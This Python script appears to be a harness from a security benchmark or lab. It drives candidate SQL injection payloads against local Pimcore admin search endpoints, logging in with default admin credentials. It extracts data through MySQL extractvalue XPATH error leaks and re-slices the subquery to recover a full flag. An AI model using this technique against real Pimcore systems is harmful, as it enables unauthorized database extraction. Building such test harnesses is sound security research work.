#!/usr/bin/env python3
"""Drive real Pimcore Admin Search Find (SearchController::findAction).

Usage: python3 seed_exec.py <candidate.json> [version]
"""
from __future__ import annotations

import http.cookiejar
import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request

ADMIN_PASS = "admin"
ADMIN_USER = "admin"
SEARCH_PATHS = {
    "v0": "/admin/search/search/find",
    "v1": "/admin/search/search/find",
    "v2": "/admin/bundle/search/search/find",
}
BASE = {
    "v0": "http://127.0.0.1:39493",
    "v1": "http://127.0.0.1:39494",
    "v2": "http://127.0.0.1:39495",
}

_OPENERS: dict[str, urllib.request.OpenerDirector] = {}
_CLASS_IDS: dict[str, str] = {}
_CSRF: dict[str, str] = {}


def _get_class_id(base: str) -> str:
    try:
        url = f"{base}/pcb_class_id.txt"
        with urllib.request.urlopen(url, timeout=10) as r:
            return r.read().decode().strip()
    except Exception:
        return "1"


def class_id(version: str = "v1") -> str:
    if version not in _CLASS_IDS:
        _CLASS_IDS[version] = _get_class_id(BASE[version])
    return _CLASS_IDS[version]


def _authenticate(base: str, version: str) -> urllib.request.OpenerDirector:
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPRedirectHandler(),
    )

    try:
        req = urllib.request.Request(f"{base}/admin/login")
        resp = opener.open(req, timeout=15)
        resp.read()
    except Exception as exc:
        print(f"[auth] login page failed: {exc}", file=sys.stderr)

    csrf = ""
    try:
        req = urllib.request.Request(f"{base}/admin/login/csrf-token")
        resp = opener.open(req, timeout=15)
        data = json.loads(resp.read().decode("utf-8", "replace"))
        csrf = data.get("csrfToken", "") or ""
    except Exception as exc:
        print(f"[auth] csrf-token fetch failed: {exc}", file=sys.stderr)
    _CSRF[version] = csrf

    login_data = urllib.parse.urlencode({
        "username": ADMIN_USER,
        "password": ADMIN_PASS,
        "csrfToken": csrf,
    }).encode()
    req = urllib.request.Request(f"{base}/admin/login/login", login_data)
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    if csrf:
        req.add_header("X-pimcore-csrf-token", csrf)
    try:
        resp = opener.open(req, timeout=15)
        resp.read()
    except urllib.error.HTTPError as e:
        e.read()
    except Exception as exc:
        print(f"[auth] login POST failed: {exc}", file=sys.stderr)

    return opener


def opener(version: str = "v1") -> urllib.request.OpenerDirector:
    if version not in _OPENERS:
        _OPENERS[version] = _authenticate(BASE[version], version)
    return _OPENERS[version]


def _get_authed(url: str, version: str, timeout: int = 25):
    op = opener(version)
    req = urllib.request.Request(url)
    req.add_header("X-Requested-With", "XMLHttpRequest")
    csrf = _CSRF.get(version, "")
    if csrf:
        req.add_header("X-pimcore-csrf-token", csrf)
    try:
        resp = op.open(req, timeout=timeout)
        return resp.getcode(), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return None, f"<get-error: {e}>"


def _xpath_leak(resp: str) -> str:
    """MySQL extractvalue 1105 text after '~' (truncated ~31 chars)."""
    import re
    blob = resp or ""
    try:
        j = json.loads(blob)
        blob = str(j.get("message") or "") + " " + blob
    except Exception:
        pass
    m = re.search(r"XPATH syntax error: ['\"]~([^'\"]*)['\"]", blob)
    if m:
        return m.group(1)
    m = re.search(r"XPATH syntax error: \\u0027~([^\\]+)\\u0027", resp or "")
    return m.group(1) if m else ""


def _find_url(candidate, version: str, fields) -> str:
    base = BASE[version]
    qs = []
    for f in fields:
        qs.append(("fields[]", f))
    filt = candidate.get("filter", "")
    if filt:
        qs.append(("filter", filt))
    qs.append(("query", candidate.get("query", "test")))
    qs.append(("type", "object"))
    qs.append(("class", candidate.get("class", "testclass")))
    qs.append(("start", "0"))
    qs.append(("limit", "10"))
    return f"{base}{SEARCH_PATHS.get(version, SEARCH_PATHS['v1'])}?" + urllib.parse.urlencode(qs)


def run_probe(candidate, *, version="v1"):
    cid = class_id(version)
    fields = [f.replace("__CID__", cid) for f in candidate.get("fields", [])]
    url = _find_url(candidate, version, fields)
    status, resp = _get_authed(url, version)
    leak = _xpath_leak(resp)
    recovered = leak
    extra = ""
    # extractvalue XPATH is ~31 chars; 43-byte PCBFLAG_* needs a second slice.
    if leak and len(leak) >= 28:
        offset = len(leak) + 1
        needle = "(SELECT flag FROM pcb_secret LIMIT 1)"
        repl = f"(SELECT substr(flag,{offset},32) FROM pcb_secret LIMIT 1)"
        fields2 = [f.replace(needle, repl) for f in fields]
        if fields2 != fields:
            url2 = _find_url(candidate, version, fields2)
            _st2, resp2 = _get_authed(url2, version)
            leak2 = _xpath_leak(resp2)
            extra = resp2 or ""
            recovered = leak + leak2
    body = (resp or "") + extra + recovered
    return {
        "version": version,
        "probe_id": candidate.get("probe_id"),
        "http_status": status,
        "response": resp,
        "body": body,
        "recovered_flag": recovered,
    }


_pbt = os.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _v in list(BASE):
        BASE[_v] = _pbt
_pt = os.environ.get("PCB_TARGET_PORT")
if _pt:
    for _v in list(BASE):
        BASE[_v] = f"http://127.0.0.1:{int(_pt)}"


if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))
